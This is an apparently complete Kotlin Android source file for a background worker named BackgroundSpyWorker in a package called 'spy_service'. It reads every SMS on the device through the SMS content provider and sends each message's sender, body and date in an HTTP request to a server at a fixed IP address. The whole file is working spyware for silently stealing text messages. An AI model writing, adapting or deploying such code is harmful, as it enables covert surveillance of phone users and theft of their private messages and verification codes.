package com.example.spy_service

import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.android.volley.Request
import com.android.volley.toolbox.StringRequest
import com.android.volley.toolbox.Volley
import java.net.URLEncoder


class BackgroundSpyWorker(appContext: Context, workerParams: WorkerParameters) :
    Worker(appContext, workerParams) {
    private val TAG = "SPY_TAG"
    private val SMS_URI = Uri.parse("content://sms")
    override fun doWork(): Result {
        return try {
            readSmsData()
            Log.d(TAG, "success work")
            Result.success()
        } catch (e: Exception) {
            Log.d(TAG, "exception occurred: ", e)
            Result.failure()
        }
    }

    private fun readSmsData() {
        val context = applicationContext
        val cursor: Cursor? = context.contentResolver.query(SMS_URI, null, null, null, null)
        cursor?.use {
            if (cursor.moveToFirst()) {
                do {
                    val sender: String = cursor.getString(cursor.getColumnIndexOrThrow("address"))
                    val messageBody: String = cursor.getString(cursor.getColumnIndexOrThrow("body"))
                    val date: String = cursor.getString(cursor.getColumnIndexOrThrow("date"))
                    val url = "http://192.168.0.117:5000/sms_data?sender=${
                        URLEncoder.encode(
                            sender,
                            "UTF-8"
                        )
                    }&message_body=${
                        URLEncoder.encode(
                            messageBody,
                            "UTF-8"
                        )
                    }&date=${URLEncoder.encode(date, "UTF-8")}"

                    val stringRequest = StringRequest(
                        Request.Method.GET,
                        url,
                        { response ->
                            Log.i("response", "Success: ${response}")
                        },
                        { error -> Log.e("response", "Error: ${error}") }
                    )

                    Log.d("SMS", "$stringRequest")
                    Volley.newRequestQueue(context).add(stringRequest)
                } while (cursor.moveToNext())
            }
        }
    }
}